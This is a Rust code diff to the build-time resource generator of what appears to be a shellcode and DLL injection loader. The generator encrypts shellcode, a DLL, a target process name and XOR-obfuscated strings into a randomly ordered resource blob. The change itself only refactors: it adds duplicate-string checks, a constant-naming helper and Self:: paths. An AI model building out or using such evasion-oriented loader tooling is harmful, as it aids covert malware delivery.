@@ -2,7 +2,8 @@ use crate::build_src::build_config::{
     DLL_PATH, PAD_RANGE, RESOURCE_ID, RESOURCE_NAME, SHELLCODE_PATH, TARGET_PROCESS, USER_STRINGS,
 };
 use crate::build_src::build_util::{
-    aes_encrypt_bytes, generate_random_bytes, get_iv_len, get_key_len, xor_encrypt_bytes,
+    aes_encrypt_bytes, generate_random_bytes, get_iv_len, get_key_len, make_const_name,
+    xor_encrypt_bytes,
 };
 use crate::build_src::required::STRINGS;
 use rand;
@@ -53,6 +54,14 @@ pub(crate) struct ResourceGenerator {
 
 impl ResourceGenerator {
     pub(crate) fn new(out_dir: String) -> Self {
+        // Check for duplicate strings before proceeding
+        if (1..STRINGS.len()).any(|i| STRINGS[i..].contains(&STRINGS[i - 1])) {
+            panic!("Duplicate strings found in STRINGS")
+        }
+        if (1..USER_STRINGS.len()).any(|i| USER_STRINGS[i..].contains(&USER_STRINGS[i - 1])) {
+            panic!("Duplicate strings found in USER_STRINGS")
+        }
+
         let aes_iv_bytes = generate_random_bytes(get_iv_len());
         let aes_key_bytes = generate_random_bytes(get_key_len());
 
@@ -88,7 +97,9 @@ impl ResourceGenerator {
 
         let strings = STRINGS
             .iter()
-            .map(|string_name| XORString::new(string_name, generate_random_bytes(string_name.len())))
+            .map(|string_name| {
+                XORString::new(string_name, generate_random_bytes(string_name.len()))
+            })
             .chain(USER_STRINGS.iter().map(|string_name| {
                 XORString::new(string_name, generate_random_bytes(string_name.len()))
             }))
@@ -133,7 +144,7 @@ impl ResourceGenerator {
         string.key_offset = payload.len();
         payload.extend(&string.key_bytes);
 
-        // We put the xor_strings back into the vector so we can write down the offsets, later.
+        // We put the xor_strings back into the end of the vector so we can write down the offsets, later.
         self.strings.insert(0, string);
     }
 
@@ -172,16 +183,16 @@ impl ResourceGenerator {
     pub(crate) fn build_resource_file(&mut self) -> &mut Self {
         // Put these functions into a vector we can then pop functions out of, to randomize position of resources.
         let mut functions: Vec<BuildFn> = vec![
-            ResourceGenerator::add_aes_key_to_payload,
-            ResourceGenerator::add_aes_iv_to_payload,
-            ResourceGenerator::add_shellcode_to_payload,
-            ResourceGenerator::add_dll_to_payload,
-            ResourceGenerator::add_target_to_payload,
+            Self::add_aes_key_to_payload,
+            Self::add_aes_iv_to_payload,
+            Self::add_shellcode_to_payload,
+            Self::add_dll_to_payload,
+            Self::add_target_to_payload,
         ];
 
         functions.resize(
             functions.len() + self.strings.len(),
-            ResourceGenerator::add_string_to_payload,
+            Self::add_string_to_payload,
         );
 
         // Randomize the position of strings and order resources are added to the final resource.
@@ -265,19 +276,20 @@ impl ResourceGenerator {
         ));
 
         self.strings.iter().for_each(|string| {
+            let const_name = make_const_name(string.string_name);
             consts.push(format!(
                 "pub const {}: usize = {:#X};",
-                string.string_name.to_uppercase().replace(".", "_") + "_POS",
+                const_name.clone() + "_POS",
                 string.offset
             ));
             consts.push(format!(
                 "pub const {}: usize = {:#X};",
-                string.string_name.to_uppercase().replace(".", "_") + "_LEN",
+                const_name.clone() + "_LEN",
                 string.encrypted_string.len()
             ));
             consts.push(format!(
                 "pub const {}: usize = {:#X};",
-                string.string_name.to_uppercase().replace(".", "_") + "_KEY",
+                const_name + "_KEY",
                 string.key_offset
             ));
         });
